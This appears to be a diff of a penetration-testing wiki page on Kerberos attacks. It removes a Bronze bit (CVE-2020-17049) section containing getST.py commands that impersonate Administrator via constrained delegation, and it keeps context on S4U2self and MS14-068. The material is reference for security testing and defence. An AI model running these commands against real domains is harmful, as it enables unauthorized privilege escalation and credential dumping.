@@ -124,26 +124,6 @@ For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject t
 A great, stealthier, alternative is to [abuse S4U2self](delegations/s4u2self-abuse.md) in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation.
 {% endhint %}
 
-### Bronze bit (CVE-2020-17049)
-
-{% hint style="warning" %}
-In order to exploit this vulnerability, attackers need to find a service able to delegate to another service (see [Kerberos delegations](delegations/)), and they need that first service account Kerberos key (NT hash or AES key, 128 or 256 bits).
-{% endhint %}
-
-For example with [constrained delegation](delegations/#constrained-delegations) set between a controlled service and a target one with protocol transition enabled and the target user being protected, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated/delegated account but it can be any user in the environment).
-
-The input credentials are those of the compromised service account configured with constrained delegations.
-
-```bash
-# with an NT hash
-getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account
-
-# with an AES (128 or 256 bits) key
-getST.py -force-forwardable -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -aesKey $Controlled_service_AES_key $Domain/$Controlled_service_account
-```
-
-The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
-
 ### MS14-068 (CVE-2014-6324)
 
 This vulnerability allows attackers to forge a TGT with unlimited power (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the [golden ticket](forged-tickets.md#golden-ticket), however, it doesn't require the attacker to know the `krbtgt`. This attack is a really powerful privilege escalation technique. However, it will not work on patched domain controllers.
